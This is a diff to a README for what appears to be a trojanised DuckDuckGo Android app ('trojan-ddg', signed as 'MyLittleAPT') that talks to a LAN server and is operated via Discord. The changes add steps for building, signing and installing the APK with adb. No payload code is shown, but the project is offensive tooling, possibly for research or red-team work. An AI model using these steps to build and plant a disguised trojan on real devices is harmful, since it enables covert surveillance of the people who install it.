@@ -117,22 +117,63 @@ Line 44: .baseUrl("http://<YOUR_LAN_IP>:8000/")
 
 > Replace `<YOUR_LAN_IP>` with the IP of the machine running the server (e.g., `192.168.0.204`). The Android device and the server **must be on the same network**.
 
-Then build and install the APK:
+Then build and install the APK.
+
+#### Option A — Android Studio (recommended)
+
+1. Open `trojan-ddg/` as a project in Android Studio.
+2. In the toolbar, select variant **`internalRelease`** (Build Variants panel).
+3. If prompted *"cannot be signed — specify a signing configuration"*, choose **`release`**.
+   The project reads credentials from `~/jenkins_static/com.duckduckgo.mobile.android/ddg_android_build.properties` automatically (see signing setup below).
+4. **Build → Build Bundle(s) / APK(s) → Build APK(s)**.
+5. APK lands at `app/build/outputs/apk/internal/release/app-internal-release.apk`.
+
+#### Option B — Command line
 
 ```bash
 cd trojan-ddg
-
-# Build debug APK (requires Java 17 in PATH, or set JAVA_HOME first)
-./gradlew assembleDebug
+JAVA_HOME=~/.local/share/JetBrains/Toolbox/apps/android-studio/jbr \
+  ./gradlew assembleInternalRelease
 
 # Install on connected device
-adb install app/build/outputs/apk/debug/app-debug.apk
+adb install app/build/outputs/apk/internal/release/app-internal-release.apk
 ```
 
-> **Java 17:** If you have no system-wide Java 17, prefix the command with your JDK path:
-> ```bash
-> JAVA_HOME=~/.local/share/JetBrains/Toolbox/apps/android-studio/jbr ./gradlew assembleDebug
-> ```
+#### Signing setup (one-time, local machine only)
+
+The `build.gradle` reads signing credentials from a `.properties` file outside the repo:
+
+```
+~/jenkins_static/com.duckduckgo.mobile.android/
+├── mla-release.jks                   ← keystore (never commit)
+└── ddg_android_build.properties      ← credentials (never commit)
+```
+
+**Generate keystore** (requires `keytool` from the Android Studio JBR):
+
+```bash
+KEYTOOL=~/.local/share/JetBrains/Toolbox/apps/android-studio/jbr/bin/keytool
+mkdir -p ~/jenkins_static/com.duckduckgo.mobile.android
+
+$KEYTOOL -genkeypair \
+  -keystore ~/jenkins_static/com.duckduckgo.mobile.android/mla-release.jks \
+  -alias mla \
+  -keyalg RSA -keysize 2048 -validity 10000 \
+  -storepass YOUR_PASSWORD \
+  -dname "CN=MyLittleAPT, O=Local, C=BR" \
+  -noprompt
+```
+
+**Create properties file** at `~/jenkins_static/com.duckduckgo.mobile.android/ddg_android_build.properties`:
+
+```properties
+key.store=mla-release.jks
+key.store.password=YOUR_PASSWORD
+key.alias=mla
+key.alias.password=YOUR_PASSWORD
+```
+
+> Both passwords must match — PKCS12 keystores (default since JDK 9) don't support separate store/key passwords.
 
 ### Step 4: Operate via Discord
 
